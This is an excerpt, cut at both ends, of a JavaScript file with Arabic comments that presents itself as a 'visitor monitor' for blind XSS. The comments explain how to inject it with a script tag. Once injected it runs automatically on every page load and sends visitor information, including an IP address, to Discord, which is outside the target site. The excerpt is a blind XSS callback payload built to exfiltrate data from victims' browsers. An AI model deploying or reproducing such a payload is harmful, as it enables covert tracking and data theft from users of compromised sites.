 ...
 *
 * سيناريو blind XSS: يكفي تضمين
 *   <script src="https://www.DOMAIN/visitor-monitor.js"></script>
 * بدون استدعاء يدوي — التحميل يشغّل الإرسال مرة واحدة (سلوك إلزامي لاختبار الاستدعاء العكسي).
 * استخدم مسار ملف .js كاملًا؛ جذر الدومين وحده يرجع HTML وليس سكربتًا قابلًا للتنفيذ.
 *
 * initVisitorMonitor() ما زال متاحًا لمن يريد إعادة الإرسال يدويًا من كود آخر.
 *
 * ملاحظة: المتصفح لا يعطي نفس رؤوس HTTP الخام؛ الـ IP عبر خدمة عامة.
 */
(function (global) {
  'use strict';
  ...
  /** تشغيل تلقائي عند كل تحميل عبر <script src="..."> — مطلوب لسيناريو blind XSS (لا تعطيل اختياري) */
  if (typeof document !== 'undefined') {
    function runMonitor() {
      sendToDiscord({}).catch(function (e) {
        console.error('[visitor-monitor]', e);
      });
    }
